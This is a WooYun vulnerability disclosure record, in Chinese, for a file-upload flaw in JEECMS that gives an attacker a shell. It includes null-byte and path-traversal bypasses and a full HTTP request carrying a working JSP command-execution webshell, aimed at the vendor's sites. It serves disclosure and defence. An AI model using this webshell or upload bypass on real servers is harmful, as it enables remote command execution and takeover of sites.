{"id": 48244, "wybug_id": "wooyun-2014-078307", "wybug_title": "JEECMS|JEEBBS|JSPGOU 前台getshell(高危)", "wybug_corp": "JEECMS", "wybug_author": "loopx9", "wybug_date": "2014-10-04 18:15", "wybug_open_date": "2015-01-02 18:16", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传安全", "代码审计"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-02：\t细节向公众公开  简要描述： 国庆大礼包. 详细说明：  国庆闲来无事，下载jeecms源码来看了下，没想到捡了个漏。0x1 漏洞分析com\\jeecms\\cms\\action\\member\\ImageUploadAct.java,上传请求URL:/member/o_upload_image.jspx\n...@RequestMapping(\"/member/o_upload_image.jspx\")\tpublic String execute(\t\t\tString filename,\t\t\tInteger uploadNum,\t\t\tBoolean mark,\t\t\t@RequestParam(value = \"uploadFile\", required = false) MultipartFile file,\t\t\tHttpServletRequest request, ModelMap model) {\t\tWebCoreErrors errors = validate(filename, file, request); //函数validate检查后缀以及文件头\t\tCmsSite site = CmsUtils.getSite(request);\t\tCmsUser user = CmsUtils.getUser(request);\t\tFrontUtils.frontData(request, model, site);\t\tMemberConfig mcfg = site.getConfig().getMemberConfig();\t\tif (!mcfg.isMemberOn()) {\t\t\treturn FrontUtils.showMessage(request, model, \"member.memberClose\");\t\t}\t\tif (user == null) {\t\t\treturn FrontUtils.showLogin(request, model, site);\t\t}\t\tif (errors.hasErrors()) {\t\t\tmodel.addAttribute(ERROR, errors.getErrors().get(0));\t\t\treturn FrontUtils.getTplPath(request, site.getSolutionPath(),\t\t\t\t\tTPLDIR_MEMBER, RESULT_PAGE);\t\t}\t\tMarkConfig conf = site.getConfig().getMarkConfig();\t\tif (mark == null) {\t\t\tmark = conf.getOn();\t\t}\t\tString origName = file.getOriginalFilename();\t\tString ext = FilenameUtils.getExtension(origName).toLowerCase(\t\t\t\tLocale.ENGLISH);\t\ttry {\t\t\tString fileUrl;\t\t\tif (site.getConfig().getUploadToDb()) {\t\t\t\t....好像是文件存进数据库，这段跳过\t\t\t\t}\t\t\t} else if (site.getUploadFtp() != null) {                               .....ftp上传相关，跳过\t\t\t\t}\t\t\t} else {\t\t\t\tString ctx = request.getContextPath();\t\t\t\tif (!StringUtils.isBlank(filename)) {  //filename为表单传进，可控 \t\t\t\t\tfilename = filename.substring(ctx.length());\t\t\t\t\tif (mark) {  //mark 为表单传进，可控\t\t\t\t\t\tFile tempFile = mark(file, conf);\t\t\t\t\t\tfileUrl = fileRepository.storeByFilename(filename,tempFile);                                                //调用storeByFilename存储文件，filename可控，第一想到的就是00截断了\t\t\t\t\t\ttempFile.delete();\t\t\t\t\t} else { //mark 不用赋值也可以，都调用了fileRepository.storeByFilename\t\t\t\t\t\tfileUrl = fileRepository\t\t\t\t\t\t\t\t.storeByFilename(filename, file);\t\t\t\t\t}\t\t\t\t} else {  //如果filename为空，则调用fileRepository.storeByExt ，后缀保留，文件重命名\t\t\t\t\tif (mark) {\t\t\t\t\t\tFile tempFile = mark(file, conf);\t\t\t\t\t\tfileUrl = fileRepository.storeByExt(USER_IMG_PATH, ext, tempFile);\t\t\t\t\t\ttempFile.delete();\t\t\t\t\t} else {\t\t\t\t\t\tfileUrl = fileRepository.storeByExt(USER_IMG_PATH, ext, file);\t\t\t\t\t}\t\t\t\t\t// 加上部署路径\t\t\t\t\tfileUrl = ctx + fileUrl;\t\t\t\t}\t\t\t}\t\t\tmodel.addAttribute(\"uploadPath\", fileUrl);\t\t\tmodel.addAttribute(\"uploadNum\", uploadNum);\t\t} catch (IllegalStateException e) {\t\t\tmodel.addAttribute(ERROR, e.getMessage());\t\t\tlog.error(\"upload file error!\", e);\t\t} catch (IOException e) {\t\t\tmodel.addAttribute(ERROR, e.getMessage());\t\t\tlog.error(\"upload file error!\", e);\t\t} catch (Exception e) {\t\t\tmodel.addAttribute(ERROR, e.getMessage());\t\t\tlog.error(\"upload file error!\", e);\t\t}\t\treturn FrontUtils.getTplPath(request, site.getSolutionPath(),\t\t\t\tTPLDIR_MEMBER, RESULT_PAGE);\t}...\n0x02 绕过检查：文件头可使用GIF89a绕过，后缀检查部分：看代码使用org.apache.commons.io.FilenameUtils.getExtension获取后缀，跟进getExtension方法，发现调用indexOfExtension\npublic static int indexOfExtension(String filename)  {    if (filename == null) {      return -1;    }    int extensionPos = filename.lastIndexOf('.'); //可以看出获取后缀的方式是截取最后一个点号的部分，那么如果filename为1.jsp%00.jpg ，就能bypass后缀检查了.    int lastSeparator = indexOfLastSeparator(filename);    return lastSeparator > extensionPos ? -1 : extensionPos;  }\nfileRepository.storeByFilename最终调用org.apache.commons.io.FileUtils.copyFile导致截断，与php copy函数类似，截断貌似发生在系统层面同样存在问题的还有一处：com\\jeecms\\cms\\action\\member\\ContributeAct.java,上传请求URL:/member/o_upload_media.jspx\n\n此处可利用截断上传任意文件.JSPGOU也存在相同问题:\n\n   漏洞证明：  (以bbs.jeecms.com为例)tips：由于jsp、jspx后缀都被web.xml中的配置过滤了，即便上传jsp也不能解析，官网使用tomcat容器，项目部署在webapps/ROOT下所以只能利用上传跳到上一级目录，也就是webapps下，这样jsp才能成功解析，上传过程会自动创建目录，方便快捷.注册用户，上传头像抓包\nPOST /member/o_upload_image.jspx HTTP/1.1Host: bbs.jeecms.comProxy-Connection: keep-aliveContent-Length: 937Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://bbs.jeecms.comUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.103 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPmHBUvQPGQdo2rN3Referer: http://demo.jeecms.com/member/contribute_add.jspxAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8,ko;q=0.6Cookie: JSESSIONID=DD2D9328CB2B7B282A1B8EB8DDD82C03; JSESSIONID=D504FA6E4E72497B7BAF703873EFC1F5; clientlanguage=zh_CN; CNZZDATA1097297=cnzz_eid%3D1834197461-1412397667-http%253A%252F%252Fjeecms.com%252F%26ntime%3D1412404613------WebKitFormBoundaryPmHBUvQPGQdo2rN3Content-Disposition: form-data; name=\"uploadFile\"; filename=\"1.jpg\"Content-Type: image/jpegGIF89a<FORM METHOD=GET ACTION=\"\"><INPUT name='cmd' type=text><INPUT type=submit value='Run'></FORM><%@ page import=\"java.io.*\" %><%   String cmd = request.getParameter(\"cmd\");   String output = \"\";   if(cmd != null) {      String s = null;      try {         Process p = Runtime.getRuntime().exec(cmd);         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));         while((s = sI.readLine()) != null) {            output += s;         }      }      catch(IOException e) {         e.printStackTrace();      }   }%><pre><%=output %></pre>------WebKitFormBoundaryPmHBUvQPGQdo2rN3Content-Disposition: form-data; name=\"filename\"../.test/p.jsp .jpg  //跳出项目目录，空格为0x00------WebKitFormBoundaryPmHBUvQPGQdo2rN3--\n\n\n\nhttp://bbs.jeecms.com/.test/p.jsp?cmd=idhttp://demo.jeecms.com/.test/p.jsp(PermGen space不够了)\n\n\nPS:除此之外，还可以上传web.xml覆盖，或是上传class覆盖，因为可能需要重启web容器，暂不采用.各位大神还有什么猥琐的利用方式，烦请告之.总结:jeecms、jeebbs ：/member/o_upload_media.jspx （低版本的没有）/member/o_upload_image.jspx后台:/common/o_upload_image.do/content/o_upload_media.do/plug/o_upload.do涉及文件：com\\jeecms\\cms\\action\\member\\ContributeAct.javacom\\jeecms\\cms\\action\\member\\ImageUploadAct.javacom\\jeecms\\cms\\action\\admin\\ImageUploadAct.javacom\\jeecms\\cms\\action\\admin\\main\\ContentAct.javacom\\jeecms\\cms\\action\\admin\\assist\\PlugAct.javajeegou：/member/common/o_upload_image.jspx下载旧版本的jeecms源码看，发现com\\jeecms\\cms\\action\\member\\ImageUploadAct.java很早就有了，意味着这个洞有一段时间了.jeecms在国内算是比较流行的java建站系统，政府机构、学校、企业，用户众多，此次漏洞该算是通杀的了，只要开放用户注册，基本就沦陷了.   修复方案：  检查所有涉及上传的操作，禁止拼接路径.   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-10-09 10:36 厂商回复： 感谢对jeecms系列软件提出的bug，我们会以最快的速度修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-04 18:25 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  大礼包...    \n     2014-10-04 19:09 |    \t\tMuZhU0 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        )\t\t \n  前排    \n     2014-10-04 19:16 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  礼包    \n     2014-10-04 20:41 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  这么牛B？    \n     2014-10-04 22:15 |    \t\t郭斯特 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:69        | GhostWin)\t\t \n  我擦。。屌    \n     2014-10-04 22:22 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1232 漏洞数:186        | 。)\t\t \n  还重新编辑了！！    \n     2014-10-04 22:43 |    \t\t天朝城管 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:35        | 不要等到命玩你的时候才开始玩命)\t\t \n  前排卖瓜子！    \n     2014-10-08 20:38 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  坐等忽略    \n     2014-10-08 22:23 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:62        | ..)\t\t \n  @贫道来自河北 都发邮件给他们了，看来是忽略的节奏    \n     2014-10-08 23:10 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @loopx9 这尼玛的厂商，上次发给他们邮件，居然还威胁我要我小心点    \n     2014-10-09 00:16 |    \t\t郭斯特 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:69        | GhostWin)\t\t \n  @贫道来自河北 那你得小心点了    \n     2014-10-09 11:34 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  吊    \n     2014-10-09 12:20 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:62        | ..)\t\t \n  诶，这不算通用么。。。    \n     2014-10-24 09:46 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @loopx9   我发现你的洞都没选择通用吧。。  是自己选择的。    \n     2014-10-24 09:47 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @loopx9   这个选了， 之前的一些没选。    \n     2014-10-24 09:49 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:62        | ..)\t\t \n  @′  雨。 @′king 是你小号?    \n     2014-10-24 10:17 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @loopx9        \n     2015-03-10 09:42 |    \t\tYiYang \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 又多了一个兴趣爱好。)\t\t \n  @loopx9 按这个操作 返回提示 alert('Unexpected block type 69!')是补洞了吗     \n     2015-09-05 15:44 |    \t\ticysun \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:6        | 求围观)\t\t \n  @loopx9 我用eclipse debug 什么都对 就是到最后进copy方法 Invalid file path 就报着个异常了，对比了几个版本，楼主这种，，臣妾做不到。对了 如果 在filename传入时 我手动干预 点击 vlues 获取下，他倒是被截断了，求指点。    \n     2015-09-05 19:06 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:62        | ..)\t\t \n  @icysun  jdk7以后版本已经不能null截断了，路径包含\\0直接抛出异常。测试截断的话用1.6版本试试。 (可查看java.io.File类 isInvalid 方法)    \n     2015-09-05 21:15 |    \t\ticysun \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:6        | 求围观)\t\t \n  @loopx9 谢大神，就是此原因，我用的1.8。不过eclipse debug有个很有意思的地方误导我很久。就是 变量截取窗口，手动戳filename下，1.8也会截断，不戳不灵，挺有意思。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}